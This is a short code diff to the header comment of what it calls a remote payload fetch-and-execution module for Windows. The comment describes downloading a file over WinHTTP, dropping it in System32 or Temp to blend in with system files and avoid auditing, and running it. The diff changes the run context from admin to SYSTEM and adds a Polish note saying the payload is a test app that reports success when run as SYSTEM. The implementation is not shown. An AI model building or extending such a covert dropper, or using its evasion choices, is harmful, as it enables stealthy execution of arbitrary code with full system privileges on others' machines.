@@ -2,7 +2,7 @@
  * Remote payload fetch and execution module.
  *
  * Downloads a file from a URL using WinHTTP API (no .NET dependency),
- * saves it to a system location, and executes it with admin privileges.
+ * saves it to a system location, and executes it with SYSTEM privileges.
  *
  * Two download backends:
  *   WinHTTP — lightweight, no browser dependencies, works in service context
@@ -20,6 +20,10 @@
  *   %WINDIR%\System32\ — blends in with system files
  *   %WINDIR%\Temp\ — writable by all users
  *   %TEMP% — user-writable, less suspicious auditing
+ *
+ * xyz.exe to osobna apka testowa (autor: user). Nasza rola kończy się
+ * na pobraniu i uruchomieniu jako SYSTEM. xyz.exe sam sprawdza
+ * swoje uprawnienia i wyświetla "Test passed" jeśli leci jako SYSTEM.
  */
 
 #pragma once
